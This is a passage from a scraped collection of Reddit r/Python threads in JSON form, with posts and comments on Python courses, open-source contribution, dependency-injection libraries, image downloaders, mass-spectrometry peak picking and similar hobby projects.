            "content": "Took this course back in 2019. If you are familiar with the language you will be fine until about week 8 / 9 when the real computer science kicks in. Overall the course was amazing and I learned a ton."
        },
        {
            "author": "Mcletters",
            "score": "74",
            "content": "I'm taking one of these now. Pretty good, but a little out of date. Still would recommend. I'm learning a lot."
        },
        {
            "author": "LDbosca",
            "score": "28",
            "content": "I did this as my first introduction to computer science. I went on to do a university course in computer science and I'd basically already done my programming 1 module. I now work as a dev for a well-known tech company and I've this course to thank in part. I can't recommend this highly enough."
        },
        {
            "author": "keeping_an_eye",
            "score": "18",
            "content": "This class, and the instructors are amazing. This class is challenging, which I thought was one of the best parts about it. This class is time consuming. You will learn a ton, but I guarantee you will need a lot of time to work on the projects. I took it when it was the first (second?) class that MITx offered online. I believe at some point they cut the class and now offer it in two parts. It was the third hardest class I've taken at MITx and I had a lot of time to dedicate to it. I believe the class is pretty close to the classes they offer their own first year undergraduates, so pretty good stuff imo. I say go for it, it's a great class, but go in with open eyes and be prepared to do some real work."
        },
        {
            "author": "1M2A3K4S",
            "score": "5",
            "content": "How useful is the certificate from it?"
        },
        {
            "author": "bowler_the_beast99",
            "score": "3",
            "content": "Thank you!!"
        },
        {
            "author": "DeviantMango29",
            "score": "2",
            "content": "They've offered this course for free for over a decade. I first got into programming with this is 2009. It was great back then too."
        }
    ]
},
{
    "post_author": "Rare-Lion1261",
    "post_id": "1bw7eh8",
    "post_score": "68",
    "post_time": "Friday, April 5, 2024 at 6:03:34 AM GMT+3",
    "flair_text": "Resource",
    "post_title": "Python open source Projects",
    "media": [],
    "post_content": "I'm seeking for python open source project where I can add things , colaborate with a community on building valuable stuff , Any good suggestions please ?",
    "comments": [
        {
            "author": "Ouitos",
            "score": "80",
            "content": "Nice try, Jia Tan",
            "replies": [
                {
                    "author": "inventorscynobiog",
                    "score": "2",
                    "content": "Noob here, someone please explain what does this mean?",
                    "replies": [
                        {
                            "author": "Ouitos",
                            "score": "9",
                            "content": "Jia Tan is the name of an open source contributor that became famous for sneakily add malicious code to a very broadly used library. Fortunately, it was detected pretty fast, but to think that he contributed for 2 years for the repo to the point of gaining enough trust with the official author that he could do releases by himself is pretty daunting. You could imagine that the plan was to put dormant malicious code, wait for the library to be installed in every Linux distribution and then use the installed backdoor. This is a really complex and long term attack that could have been a very serious threat. Anyway, the attack was identified very quickly, so I thought it was funny to imagine that Jia Tan was now searching for another repo to attack by contributing to it."
                        }
                    ]
                }
            ]
        },
        {
            "author": "KingsmanVince",
            "score": "40",
            "content": "MunGell/awesome-for-beginners: A list of awesome beginners-friendly projects. (github.com)"
        },
        {
            "author": "cataploft-txt",
            "score": "15",
            "content": "Good First Issue has some python projects"
        },
        {
            "author": "kp729",
            "score": "9",
            "content": "I'm assuming that you already have some level of proficiency in Python and are using various Python modules for your tasks. Most modules are open-source and you can simply contribute to the one you think lacks in a certain functionality. Instead of finding a random Python project, contribute to the ones that you are using and wish were better."
        },
        {
            "author": "Hey_Look_80085",
            "score": "6",
            "content": "Ursina engine OpenXTalk sure could use a Python language binding through the Builder language, and that would solve Pythons \"We have the shittiest GUI tools\" problem."
        },
        {
            "author": "furious_cowbell",
            "score": "4",
            "content": "Look at the tools you use and enjoy but think you can improve them"
        },
        {
            "author": "Neko7Nik",
            "score": "3",
            "content": "I'm looking for someone to collaborate on my new auth project. If you're interested, check out this Reddit Post for some details. Edit: This project is quite new, only about a week old"
        },
        {
            "author": "builderjer",
            "score": "4",
            "content": "r/OpenVoiceOS Https://github.com/OpenVoiceOS"
        },
        {
            "author": "techintheclouds",
            "score": "3",
            "content": "Right now, I am just reading Reddit, and I just wanted to give you a heads up. If I git-clone and build it without any problems I'll reach out. Any good first issues to keep an eye on? I'm also looking for contributors to a few projects."
        },
        {
            "author": "nicholashairs",
            "score": "3",
            "content": "Can also check out r/opensource"
        }
    ]
},
{
    "post_author": "SilkTouchm",
    "post_id": "j6xdak",
    "post_score": "1716",
    "post_time": "Wednesday, October 7, 2020 at 10:18:54 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Anyone else uses the Python interpreter as a calculator?",
    "media": [],
    "post_content": "It's just so comfy.",
    "comments": [
        {
            "author": "underscores_ftw",
            "score": "614",
            "content": "Yes, and especially to do math with dates. Need to know what the date will be in 90 days? Easy: import datetime datetime.datetime.now() + datetime.timedelta(days=90)"
        },
        {
            "author": "LuckyLeague",
            "score": "277",
            "content": "You can also use Sympy for algebraic calculations and exact answers. For example: Simplifying: from sympy import * simplify(\"(2+sqrt(4))/(3-sqrt(2))\") This returns: 4*sqrt(2)/7 + 12/7 Expanding: expand(\"(a+b)**2\") This returns: a*x**2 + 2*a*b + b**2 Factoring: factor(\"9*x**2 - 16\") This returns: (3*x - 4)*(3*x + 4) Solving Equations: solveset(\"24*x**2 + 64*x + 32\") This returns: {-2, -2/3}"
        },
        {
            "author": "NelsonMinar",
            "score": "178",
            "content": "All the time. And if somehow you don't know this trick, _ evaluates to the value of the last expression. Ie: >>> 3+2 5 >>> _*4 20"
        },
        {
            "author": "_niva",
            "score": "47",
            "content": "For Linux users: When I press the calculator key on my keyboard, a terminal window with python opens where math is already imported. I have \"alacritty -t calculator -e python -i -c'import math as m'\" XF86Calculator in ~/.xbindkeysrc. Alacritty is my terminal emulator."
        },
        {
            "author": "qtc0",
            "score": "86",
            "content": "import scipy.constants as sc ^ lets you use physical constants, e.g., sc.h for plancks constant"
        },
        {
            "author": "Alex_ragnar",
            "score": "22",
            "content": "Yeah, even during online exams"
        },
        {
            "author": "vswr",
            "score": "39",
            "content": "I use the interpreter all the time for quick math, date, and other tasks. And then.... >>> exit Use exit() or Ctrl-D (i.e. EOF) to exit >>> sigh why do I keep doing that?"
        },
        {
            "author": "Augusto2012",
            "score": "35",
            "content": "I knew I wasn't the only one."
        },
        {
            "author": "DorchioDiNerdi",
            "score": "49",
            "content": "Who doesn't?"
        },
        {
            "author": "LirianSh",
            "score": "17",
            "content": "I made a programs for school where for example i can just write down a and b and i will find c in a triangle, instead of typing it out on a calculator"
        }
    ]
},
{
    "post_author": "HalfAByteIsWord",
    "post_id": "1bu7bs0",
    "post_score": "0",
    "post_time": "Tuesday, April 2, 2024 at 10:14:42 PM GMT+3",
    "flair_text": "Meta",
    "post_title": "Genuine question: Where should I share my opinion about Python language?",
    "media": [
        "https://github.com/rajaravivarma-r/python-robyn-react"
    ],
    "post_content": "I recently posted my opinions on the import system in Python and how it can be made more intuitive and straightforward.\nI got some comments, some of them are just snappy as usual and some of them had some suggestions and workarounds.\nEither way the post got removed, citing that it is not suitable for this sub-reddit. I mean, come on, I cannot talk about Python features in Python sub-reddit?\nUpdate:\nTo mods: Thanks for letting me have this conversation.\nTo others who made helpful comments, thank you.\nOriginal post:\nI don't want to recreate the post verbatim here, I don't remember it exactly too. It was basically something like this,\n*requiring* or *loading* code, which is more or less importing can be much more straight forward if we can directly load files.\nInstead of the concept of packages, each file is a self contained module which can import and export classes, variables and functions.\nFor example,\nsrc/constants.py\nADMIN_ROLE_NAME = 'admin'\nsrc/user.py\nfrom constants import ADMIN_ROLE_NAME\ntests/user_test.py\nfrom ../../src/constants.py import ADMIN_ROLE_NAME\nHere there would be no __init__.py files, just straightforward imports directly from files.\nI would refrain from giving example from Ruby or JS, like I did in the original post, because people perceive it as a fan boy post, while my intention is not that.\nI'll give a real example,\nHere is my repo, which https://github.com/rajaravivarma-r/python-robyn-react\nI tried to put the contents of the `constants.py` file into `src/__init__.py` but there is no way of me importing them from within the child directory package, namely `src/api/__init__.py`.\nBackward compatibility:\nLot of you have mentioned about how this would break existing code, but C++ standard had a recommendation to introduce module systems to new code which goes like this. Add a pragma like #pragma C++14_Modules at the top of the file, or something like that, but you get the idea.\nRuby has a # frozen_string_literal: true\nSo Python could introduce something like that for new code, while treating the rest of the old code as it is.\nI believe this is constructive enough.\nI know this is not a PEP, but I want to show the community that my intention was genuine and not a rant.\nOutro:\nAssume ignorance rather than malevolence.\nYour snarky comments or aggressive down voting doesn't improve anyone's life. Last time when I posted about some surprising behaviour of Python in this community (from my old account), I got a comment about my daughter and wife. It wasn't even deleted despite reporting.",
    "comments": [
        {
            "author": "AutoModerator",
            "score": "1",
            "content": ""
        },
        {
            "author": "fizzymagic",
            "score": "41",
            "content": "A lot of people have a lot of opinions about what would make a language better. Almost always those opinions are a result of the person not understanding the language well enough. That's what happened with your previous post. I remember completely hating on Rust's \"let\" keyword until I understood a little about Rust. My recommendation is that you try to understand why Python does things the way it does before suggesting \"improvements.\"",
            "replies": [
                {
                    "author": "HalfAByteIsWord",
                    "score": "1",
                    "content": "I do understand the language well. Can you point me what is the part I'm not understanding? It would be more helpful."
                },
                {
                    "author": "Viruses_Are_Alive",
                    "score": "-1",
                    "content": "Except R. R is a garbage language that should be removed from existence."
                }
            ]
        },
        {
            "author": "mm007emko",
            "score": "26",
            "content": "Python community has PEP documents, submit one, please. It's one of the best community processes and discussions I've seen, given the popularity of the language and the size of its community. (I do code in Python because I am paid for it => I don't really consider myself as a member of a community.) However please keep in mind that many people can have opinions on how import systems could and should be simplified, however package/module/namespace/library systems need to serve the whole community, not one person and need to support a lot of use cases. You can't just ignore an edge case because it doesn't concern you. It's a compromise between usefulness and simplicity. And you can't break someone else's code by making such change - backwards compatibility will certainly bring complexity. If Python import system doesn't suit you, you can always mess with importlib. What is preventing you from implementing your ideas and sharing them on Github and making showcase on Youtube?"
        },
        {
            "author": "PocketBananna",
            "score": "19",
            "content": "how it can be made more intuitive and straightforward That sounds very subjective. Whatever you suggested would likely not be backwards compatible or work on the already lately established Python ecosystem. More trouble than it's worth. I cannot talk about Python features in Python sub-reddit? Sure you can, but it's not like this is some official channel. If there isn't potential for good critical discussion or your post shows a lack of understanding of Python and the ecosystem then mods will take it down."
        },
        {
            "author": "metaphorm",
            "score": "77",
            "content": "Two notes for you (without having seen the removed post) Why do you want to express your opinion? Is it ego stroking or are you trying to make a positive change in the Python ecosystem? If it's the former, keep it yourself. If it's the latter, there are better ways to get involved with the Python language ecosystem than shitposting on Reddit. Your opinions about programming language design are likely informed by a mixture of your personal experiences, your own biases, and the technical problems you're trying to solve with Python. You shouldn't assume that what makes sense to you will make sense to someone else with different experiences, biases, and technical problems. Perhaps you wrote your post in a way that was very egocentric and closed to the perspectives of other people.",
            "replies": [
                {
                    "author": "Henrique_____",
                    "score": "23",
                    "content": "If I remember the post correctly, he wanted Python to be more like JavaScript."
                }
            ]
        },
        {
            "author": "ThatSituation9908",
            "score": "23",
            "content": "You're welcome to share your ideas at the official Python forums. This is where many PEPs get started and decided. https://discuss.python.org/"
        },
        {
            "author": "Hefty-Tradition-3461",
            "score": "26",
            "content": "Hello, I think you can submit pep document for change"
        },
        {
            "author": "TransitoryPhilosophy",
            "score": "20",
            "content": "Code > opinions"
        }
    ]
},
{
    "post_author": "R1ngoB",
    "post_id": "1bz3tyq",
    "post_score": "25",
    "post_time": "Monday, April 8, 2024 at 8:27:36 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "magic-di: Dependency Injector with minimal boilerplate code, built-in support for FastAPI and Celery",
    "media": [
        "https://github.com/woltapp/magic-di"
    ],
    "post_content": "I’m excited to share something we’ve been working on at Wolt: a new dependency injection library for Python “magic-di”. Born from our experience with a large service that has many components such as: API, event consumers, background workers, and cron jobs. magic-di aims to simplify dependency management without the hassle.\nfrom magic_di.fastapi import inject_app, Provide\n\napp = inject_app(FastAPI())\n\n@app.get(path=\"/hello-reddit\") \ndef hello_reddit(service: Provide[Service]) -> dict: \n  return { \n     \"is_connected\": service.is_connected(),\n  }\nWhat Project Does\nmagic-di cuts through the complexity of dependency management by adhering to a “zero-config” philosophy. It was developed to address the challenges we faced in managing code dependencies across various deployments, aiming for a straightforward solution.\nCore Concepts\nZero Config: Setup is a breeze with magic-di. There’s no need to wrangle with injector configurations. All parameters in dependencies should either be injected or fetched from the environment, file, or any other source\nConnectable Dependencies: Dependencies should implement a Connectable interface, which mandates __connect__ and __disconnect__ methods. This neat feature ensures that your dependencies are properly initialized and shut down.\nDependency Order Resolution: magic-di ensures dependencies are injected in the correct order and ready to use right away once it’s injected\nTarget Audience\nmagic-di is ideal for Python developers looking for a straightforward dependency injection solution that helps to think only about business logic and not about boilerplate code. It’s designed to keep things simple, focusing on getting the job done without unnecessary configuration.\nComparison\nmagic-di differs from existing solutions by focusing on simplicity and practicality:\nCompared to FastAPI’s built-in DI:\nFastAPI couples your logic to its ecosystem. magic-di offers a framework-agnostic approach, making it easier to integrate without tying your code to a specific framework.\nCompared to python-dependency-injector: This library can be heavy on boilerplate. magic-di aims to reduce boilerplate to the bare minimum, advocating for a design where dependencies are self-configuring.\nGoals\nOur main goal with magic-di is to provide a DI tool that’s easy to integrate and simplifies the developer’s workflow. We wanted to address the common pain points in dependency management without introducing new complexities.\nIn essence, magic-di is about making dependency injection straightforward and hassle-free for Python developers. It’s a tool born from practical needs, and while it may not revolutionize the field, it certainly aims to improve how we handle dependencies in our projects.\nWe believe magic-di can make a positive impact on your projects, and we’re eager for you to try it out and share your thoughts. Your feedback is crucial as we continue to refine and improve this tool\nRead more about magic-di: https://github.com/woltapp/magic-di",
    "comments": [
        {
            "author": "Jesussy",
            "score": "7",
            "content": "I'm thinking to use magic on my upcoming side project, great stuff It's fascinating to see the Python community steadily introduce new libraries aimed at simplifying Dependency Injection. Some recent additions to the scene include FastDepends and Dishka. I'm curious to see how magic-di will stack up against these. It's like a silent battle for the most efficient and user-friendly DI solution",
            "replies": [
                {
                    "author": "Tishka-17",
                    "score": "1",
                    "content": "That's funny, I was going to write about Dishka on reddit few days ago as I finally released 1.0 version but somewhy deferred it. Yes, there are lots of similar projects with ~10 stars on github which I missed when I was starting development of dishka. I believe I can take best parts of them: that why I discarded \"zero config\" feature - such approach is used in fastapi and it brings a lot of pain."
                }
            ]
        },
        {
            "author": "1One2Twenty2Two",
            "score": "3",
            "content": "FastAPI couples your logic to its ecosystem That is not true, though. With FastAPI's Depends, for example, you can just wrap an imported (and independent) class into a callable and feed that into Depends. It's clean, simple and it allows you to easily chain all of your dependencies without coupling anything.",
            "replies": [
                {
                    "author": "thedeepself",
                    "score": "1",
                    "content": "I'm curious: does the lack of class-based controllers in FastAPI limit you ?"
                }
            ]
        },
        {
            "author": "ForeignSource0",
            "score": "2",
            "content": "So I found myself in a similar position a few months back and ended up writing wireup because I didn't like the other frameworks that were available at the time; I took some inspiration from Spring/Symfony DI which I had previously used and adapted it for Python. I am very curious on the choice of adding the connect/disconnect instead of simply using the constructor. Was there some pitfall you were trying to avoid? Also, it's a bit unclear from the docs how configuration works. Are all services expected to inject one single big configuration object or are the devs expected to create many of them, one for each thing to configure? For example in the most trivial case, i want to inject APP_DB_DSN in the db service and APP_REDIS_DSN in another redis service.",
            "replies": [
                {
                    "author": "R1ngoB",
                    "score": "1",
                    "content": "Was there some pitfall you were trying to avoid? Yes, one of the main pitfalls we wanted to avoid was making code coupled with magic-di. By adopting a Protocol-based approach, we ensure that developers are not required to include direct references to magic-di within their code. Here is our motivation behind this: At Wolt, we have a lot of different teams, each with the autonomy to select their preferred methodologies for project development. Despite this variety, we strive to provide common tools and libraries that are accessible to everyone. For those who use magic-di, integrating a client from our library should be straightforward—simply install, import it and add it to the type hints. Conversely, for those not using any dependency injector, our aim is that they too can use our libraries without introducing unnecessary dependencies. We want to be flexible. If there comes a time when developers decide to move away from magic-di, for any reason, we want to ensure that this can happen smoothly and without the need for extensive refactoring. The Protocol-based approach allows you to write your code independently of magic-di. This independence means you can reuse your classes without magic-di or easily integrate them into libraries that do not depend on magic-di."
                },
                {
                    "author": "R1ngoB",
                    "score": "1",
                    "content": "Also, it's a bit unclear from the docs how configuration works. Are all services expected to inject one single big configuration object or are the devs expected to create many of them, one for each thing to configure? It totally depends on the developers. Developers are free to choose the approach that they prefer"
                }
            ]
        },
        {
            "author": "PhENTZ",
            "score": "1",
            "content": "How does it compare to kink ?",
            "replies": [
                {
                    "author": "Tishka-17",
                    "score": "1",
                    "content": "Let me as a developer of another project `dishka` tell my opinion on this. From my perspective any Dependency Injection framework should follow two rules: Do not break dependency injection rule Support scoped dependencies. In details: Dependency injection means exactly one thing: user of dependency has no idea where to get it. It can be single value, multiple values for different instances and so on. Global variables is not a dependency injection, even if they have 2phase initialization. Global factories is not a dependency injection. Service locator is not a dependency injection. Special markers for di-framework can be allowed, but in some cases you want to inject 3rd party objects in other 3rd party objects. It should be supported somehow. Scoped dependencies in this context means that some objects should be reused in some context. Imagine, you have two DAOs for different parts of same database. To use them in transaction you should share same connection among usch DAOs. But! It is not a singleton - you application is pretty often running in concurrent environment (using threads or asyncio tasks), so there are multiple connections at a same time, though they are shared within same scope. You can achieve it easily if you are NOT using DI-framework. I cannot see any of this in `kink`. I have more ideas about what should be implemented in good DI-framework, you can read them here: https://dishka.readthedocs.io/en/stable/requirements/technical.html All of them are currently implemented in dishka."
                }
            ]
        }
    ]
},
{
    "post_author": "MonsieurKebab",
    "post_id": "1bso6rs",
    "post_score": "51",
    "post_time": "Monday, April 1, 2024 at 2:21:07 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Wrote a Python script for downloading images/GIFs from subreddits in bulk.",
    "media": [
        "https://github.com/SeyfullahGundogdu/nixos-config",
        "https://github.com/SeyfullahGundogdu/dwn_rig"
    ],
    "post_content": "What my Project Does\nIt's a program that searches through posts in a specified subreddit and downloads images, gifs etc.\nTarget Audience\nIt's a toy project at this point, but I might extend its functionality if I can find good resources. Maybe even add support for different websites (imgur et al.).\nComparison\nI found a few websites for downloading images from reddit but they claimed they didn't work because of the Reddit API changes, I was sceptical and wrote my own script.\nAnyhow,\nFor the last few days I was trying to find good wallpapers for my system. I wrote a Python script for getting images and gifs from subreddits, here is the project repo. Please read the instructions before using it.\nIt's pretty basic but gets the job done. I am still working on the project.\nI also wrote a flake.nix for my NixOS bros. Didn't test the project on Windows but I don't see why it wouldn't work.\nLastly, here is my NixOS config in case you are interested. Enjoy",
    "comments": [
        {
            "author": "FUS3N",
            "score": "16",
            "content": "Its a great project and not trying to be rude but I see these exact project every few days here. If you don't provide anything unique people are unlikely to use yours over others.",
            "replies": [
                {
                    "author": "BeverlyGodoy",
                    "score": "7",
                    "content": "https://www.google.com/search?q=reddit+image+downloader+github True. A quick Google search actually brings tons of similar projects. But I think it's always good to practice and learn to do it yourself but when showcasing there should be differences pointed out."
                },
                {
                    "author": "MonsieurKebab",
                    "score": "6",
                    "content": "Didn't know that it was quite a popular kind of project, but still I couldn't find those. Maybe there is someone who couldn't find those tools either and they might come across this page. And I think even if no one uses this , it's still better to share than not. At the end of the day it's just another tool. Nothing ambitious at the moment.",
                    "replies": [
                        {
                            "author": "FUS3N",
                            "score": "4",
                            "content": "True I mean there's always gonna be more, for clarity I make tools that exist all the time and sometimes share here too, but just wanted to let you know that people do these kinds of posts.",
                            "replies": [
                                {
                                    "author": "MonsieurKebab",
                                    "score": "4",
                                    "content": "Yeah man same for me, thanks for your input btw. Really appreciate it."
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "theng",
            "score": "1",
            "content": "add a user subs and don't dl duplicates",
            "replies": [
                {
                    "author": "MonsieurKebab",
                    "score": "1",
                    "content": "I save the latest post's name when downloading as a way to continute from there at the next invocation and not download the same posts again. I'll try to improve it, also thanks for multiple subs idea."
                }
            ]
        },
        {
            "author": "gahddamm",
            "score": "1",
            "content": "Where does your program save the images to?",
            "replies": [
                {
                    "author": "MonsieurKebab",
                    "score": "1",
                    "content": "By default it creates a downloads folder where you run it. Check the readme for more info."
                }
            ]
        }
    ]
},
{
    "post_author": "M4D4R4G0D",
    "post_id": "hhe1eb",
    "post_score": "1713",
    "post_time": "Sunday, June 28, 2020 at 4:05:49 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "I was able to install and use Jupyter Notebook on my Android smartphone! (Through the terminal and without using root access)",
    "media": [
        "https://preview.redd.it/71tq4atqgn751.png?width=640&crop=smart&auto=webp&s=a239863ed4a3dc1c00a59e3ca9493c6a02ac7a6d",
        "https://i.redd.it/71tq4atqgn751.png"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "skrt123",
            "score": "163",
            "content": "lets keep this quiet i dont want my boss to know lmao",
            "replies": [
                {
                    "author": "M4D4R4G0D",
                    "score": "26",
                    "content": "Kkkkkkkmkkkkkkkk",
                    "replies": [
                        {
                            "author": "Boinbo",
                            "score": "20",
                            "content": "Why does this have downvotes"
                        }
                    ]
                }
            ]
        },
        {
            "author": "Thomillion",
            "score": "139",
            "content": "We need a tutorial ASAP"
        },
        {
            "author": "_Bad_Wolf_",
            "score": "26",
            "content": "Yep, I've done this with Pydroid."
        },
        {
            "author": "its_a_gibibyte",
            "score": "44",
            "content": "I'm not sure what the point of this is. Wouldn't you prefer to connect to an externally hosted server? Then you could view/edit notebooks that you wrote on your computer, and if you generate anything good it'll be available on your computer too. Plus, you'd have the processing power of the server instead of a cell phone. Is this primarily about not having web access?"
        },
        {
            "author": "[deleted]",
            "score": "11",
            "content": "Interesting af. But imagine the pain you have to go through coding with your phone."
        },
        {
            "author": "jingw222",
            "score": "14",
            "content": "Open up a Google Colab in a browser wherever there's a Internet connection, with all those packages for data science preinstalled and a free GPU access."
        },
        {
            "author": "jackmaney",
            "score": "3",
            "content": "Oh...oh god...why???"
        },
        {
            "author": "onlyarkasha",
            "score": "6",
            "content": "Is this difficult to make?"
        },
        {
            "author": "ishanpandey",
            "score": "4",
            "content": "I also did it but can you use pyperclip library in unrooted phone? I tried everything but couldn't get it through."
        },
        {
            "author": "BeneficialBear",
            "score": "5",
            "content": "it's quite shitty to code on anything lesser than a 13\". Just one line of code and one line of output + jupyter taskbar takes about half of a screen WITHOUT keyboard. There's a reason while nobody is coding on smartphones."
        }
    ]
},
{
    "post_author": "robbie_s1",
    "post_id": "1bz6a5h",
    "post_score": "3",
    "post_time": "Monday, April 8, 2024 at 10:05:47 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "3-dimensional/ heatmap peak picking? ",
    "media": [],
    "post_content": "Hello python community. I’m pretty new to scripting and come from a pure chemistry background. I’m working with 3-D MALDI-trapped ion mobility mass spectrometry data and I’ve been looking for a solid algorithm that can peak pick from two ‘time-resolved’ dimensions (mass and mobility), and the intensity arrays associated with those two dimensions. I need to peak pick from a heatmap essentially. Does anyone know of any good 3-D peak picking algorithms, or otherwise know how I can approach this? Thank you all!",
    "comments": [
        {
            "author": "mon_key_house",
            "score": "1",
            "content": "What format you have the data in? How is this different from an extreme value search?",
            "replies": [
                {
                    "author": "robbie_s1",
                    "score": "1",
                    "content": "The data is in a proprietary format. I have to use the company’s API to extract out certain information from the dataset. But it seems like you have to extract the arrays for each dimension individually, and can’t do it all at once with a single command. So I’ll have to put it into a readable file format and then do the 3-dimensional peak picking I was describing"
                }
            ]
        },
        {
            "author": "thisdude415",
            "score": "1",
            "content": "I have played around doing something similar in LCMS data, which can similarly be considered a 2D space (retention time and m/z) or ND space (integrating selected ion fragments, UV, etc) First, think about your science. Do you need to find one peak, a discrete number of peaks, or identify an unknown number of peaks? Do you know the \"minimum maximum\" you are looking for, or do you recognize it by its surroundings? There are a few different approaches, but essentially, you are just finding local maxima. Are you aware of pyOpenMS? This is a great way to load/manage MS data with some great features too. The basic approach I would recommend is essentially to clean/simplify your dataset with filters, then segment it with algorithms borrowed from image processing (e.g. something like simple threshold, then median filter to smooth noise, then tophat filter to fill \"gaps\", then watershed segmentation to identify putatative peaks) then use this \"map\" of regions to do analyses on the original dataset. The watershed map will essentially be a \"picture\" of \" (inverse) watersheds\" wherein across the m/z, 1/k_0 \"coordinate field\", each point belongs to a particular \"watershed\" meaning it has a path that only goes \"up\" in intensity until it reaches a local maxima, from which it cannot move in any direction to go higher. Then you can analyze your watersheds to generate statistics about them, then sort them by max single point intensity or max integrated intensity, or max normalized intensity, or more complex calculations such as 95%tile intensity, etc. A lot of this is highly dependent on your sample, instrument resolution, etc. Play with the algorithms on simple positive and negative control datasets that you understand very well, then expand from there. Happy peak hunting :) Ninja edit: oh, and scipy has some good packages here. Look particularly at scipy.signals and scipy.ndimage. Potentially OpenCV has faster image processing algos, but YMMV. Also consider crossposting to https://www.reddit.com/r/massspectrometry/",
            "replies": [
                {
                    "author": "robbie_s1",
                    "score": "1",
                    "content": "Lots of considerations. I’m going to be running untargeted analyses on bacterial colonies using MALDI. Overall idea would be to use Bruker’s prototype PRM-MALDI in conjunction with tims to peak pick ideal precursors for subsequent fragmentation in a pseudo-DDA style method. Problem is, I think the PRM-MALDI .d file format is so new that most mzML converters don’t recognize how the ms2 data is organized. My former labmate created timsConvert, which was designed specifically for Bruker TDF (tims data file) conversion to .mzML, but again, might not be up-to-date enough to recognize this prototype file format. I know the API does however have a module for PRM-MALDI, so I may be able to use that. Same former lab member also wrote a python wrapper for the Bruker API, but it isn’t super well documented so I’m having to sift through the nitty gritty to figure out the usage. There’s also opentims.py which is a similar thing that is better documented but only handles LC-tims-MS data and not MALDI (sigh). But basically once I actually can get the data extracted out into either a single dataframe, or multiple, I need to figure out the actual peak picking methodology I need to use and hopefully whatever I decide to use is well documented. I have been looking into the scipy image processing packages, so maybe I’ll take another gander at that. I’m just very new to the syntax and python structure, so this has been a challenge to make progress on. Feels like I have been banging my head against a wall for the past couple weeks…",
                    "replies": [
                        {
                            "author": "thisdude415",
                            "score": "1",
                            "content": "Feel free to post code examples here and you may get better results that way. My guess is that you will need to get deeper into the data structures if you're working with a newer data format. I'm not sure that (pandas) dataframes are the best approach here, although I would defer to your lab's standard practices. I think working with raw numpy arrays will be the better approach. At the end of the day, all N-dimensional data starts with 1D data, that then gets stacked into a 2nd dimension, 3rd dimension, etc. Reconstructing that is probably a prerequisite to doing peak picking in any sort of python package. Is your MALDI actually XY aware? (As you know maldi is technically just an ionization technique) If you have non-confidential small sample sets, posting those could help as well.",
                            "replies": [
                                {
                                    "author": "robbie_s1",
                                    "score": "1",
                                    "content": "The challenge with MALDI data is simply the lack of dimensionality, which I know sounds funny, but you’d be surprised about the lack of software than can present the MALDI data in a well-formatted structure. You end up having to work exclusively using frames to define everything rather than separate samples. It’s because in LC-MS data, the frames are linked to retention time (this is exclusive to tims datasets) and most software is designed to work with multiple frames from a single LC-MS run, where as in MALDI there is not LC, so most software reads the MALDI dataset as a collection of frames that add up to a single “LC-MS” run, but the “retention time” is instead replaced with the time during the batch acquisition that the laser hits a certain spot. This limits having to collect individual MALDI spectra instead of performing a batch run (like you would with a sequence table in LC-MS). This is why most people using MALDI end up having to make their own batch processing scripts. And my mistake there, I actually do currently work with numpy arrays directly whenever I am working directly with the data itself. They can then get converted or stored in a data frame depending on the application. I was intending to speak more generally there. I will talk with my advisor to see if she is cool with me posting some code or some datasets up. Since this is a prototype functionality, I’m not certain how much exactly I can reveal but that would be the most helpful thing for sure."
                                }
                            ]
                        }
                    ]
                }
            ]
        }
    ]
},
{
    "post_author": "dome271",
    "post_id": "ep8h1m",
    "post_score": "1796",
    "post_time": "Thursday, January 16, 2020 at 12:08:10 AM GMT+3",
    "flair_text": "",
    "post_title": "I made an Instagram Bot that downloads any video post you send to him and sends it back to you as mp4. Source Code will follow later https://instagram.com/instaadownload",
    "media": [
        "https://external-preview.redd.it/IPKnkKiNXH2DK5cnfpzUOpN6cTsvS5O-Ea4z1FOI8_E.png?width=640&crop=smart&format=pjpg&auto=webp&s=b90b6ed2ed2dc15b284092db8e29eae23bc22e9b"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "nozzy23",
            "score": "67",
            "content": "Awesome man!"
        },
        {
            "author": "MisterBlggs",
            "score": "60",
            "content": "How does it handle private accounts?",
            "replies": [
                {
                    "author": "dome271",
                    "score": "143",
                    "content": "Writes a message that the account is private and thus it can't download it. However it sends a follow request to the account. I'll add a feature that the post from the private account will be saved and as the private account accepts the follow request it will download the video and send it to the person",
                    "replies": [
                        {
                            "author": "SomewhatNotMe",
                            "score": "19",
                            "content": "Could you run the bot on your account and just tag yourself?"
                        },
                        {
                            "author": "pyper156",
                            "score": "9",
                            "content": "Forgive me if I'm missing something, but how can you ask for a specific video from an account to which you have no access?"
                        },
                        {
                            "author": "whatsdaddygonnado",
                            "score": "5",
                            "content": "make a bot that runs 24/7 and follows every private account with more than a certain number of followers. This would actually be useful considering how many shared posts I get are from private accounts. Instead of having to go through the trouble of following the account myself I’ll just send your bot the link."
                        }
                    ]
                }
            ]
        },
        {
            "author": "dome271",
            "score": "32",
            "content": "https://instagram.com/instaadownload"
        },
        {
            "author": "python_js",
            "score": "13",
            "content": "Im jealous of this idea, Ive been looking for a personal project to do. This sounds like an awesome project but now it has already been done :P"
        },
        {
            "author": "[deleted]",
            "score": "9",
            "content": "This is great"
        },
        {
            "author": "JohnnyCincoCero",
            "score": "6",
            "content": "Damn....this is inspiring. I got to get it in gear. Thanks"
        },
        {
            "author": "Enivecivokke",
            "score": "6",
            "content": "When will you release source code i really like to see how you get direct messages"
        },
        {
            "author": "ZackWeinstein",
            "score": "4",
            "content": "Remind me 1week"
        },
        {
            "author": "LaPist0la",
            "score": "4",
            "content": "Very nice bro ! I am trialing it now lol"
        }
    ]
},
{
    "post_author": "Motox2019",
    "post_id": "1bx5ea3",
    "post_score": "49",
    "post_time": "Saturday, April 6, 2024 at 10:09:14 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "PyPDFCompare PDF Comparison CLI Tool",
    "media": [
        "https://github.com/TMan9654/PyPDFCompare"
    ],
